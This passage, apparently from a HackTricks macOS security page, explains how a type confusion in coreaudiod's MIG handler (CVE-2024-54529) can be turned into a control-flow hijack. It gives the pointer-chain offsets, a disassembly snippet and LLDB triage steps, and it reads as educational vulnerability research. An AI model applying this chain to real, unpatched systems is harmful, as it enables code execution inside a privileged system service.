{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
